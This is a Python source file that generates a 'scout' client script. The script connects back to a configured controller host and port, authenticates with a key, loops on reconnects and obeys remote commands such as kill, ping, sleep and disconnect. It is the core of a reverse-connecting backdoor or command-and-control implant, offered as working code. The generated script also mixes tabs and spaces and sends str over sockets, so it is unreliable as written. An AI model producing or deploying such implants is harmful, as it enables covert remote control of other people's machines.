import library.modules.config as config

config.main()

def main():
    host = config.scout_values['Host'][0]
    port = config.scout_values['Port'][0]
    key = config.key
    timeout = config.scout_values['Timeout'][0]
    filepath = config.scout_values['Path'][0]
    f = open(filepath,'w')
    f.write('''import socket
from time import sleep
def recv_all(sock):
    sock.settimeout(None)
    data = sock.recv(999999)
    sock.settimeout(2)
    while True:
        try:
            tmp_data = sock.recv(999999)
            if not tmp_data:
                raise socket.error
            data += tmp_data
        except (socket.error, socket.timeout):
            return data
while True:
    while True:
        try:
            s = socket.socket()
            s.settimeout(variable_timeout)
            s.connect(('variable_host',variable_port))
            s.sendall('variable_key')
            break
        except (socket.timeout,socket.error):
            continue
    while True:
        try:    
    	    data = recv_all(s)
            command = data.split(' ',1)[0]
            if command == 'kill':
                s.sendall('[*]Scout is killing itself...')
                quit()
            elif command == 'ping':
                s.sendall('[+]Scout is alive')
            elif command == 'sleep':
                length = int(data.split(' ',1)[1])
                s.sendall('[*]Scout is sleeping...')
                for i in range(length):
                    sleep(1)
                break
            elif command == 'disconnect':
                s.sendall('[*]Scout is disconnecting itself...')
                sleep(3)
                break
            else:
                s.sendall('[-]Please enter a valid command')
        except (socket.error,socket.timeout):
            s.close()
            break
        except IndexError:
            s.sendall('[-]Please supply valid arguments')
'''.replace('variable_timeout',timeout).replace('variable_host',host).replace('variable_port',port).replace('variable_key',key))
    f.close()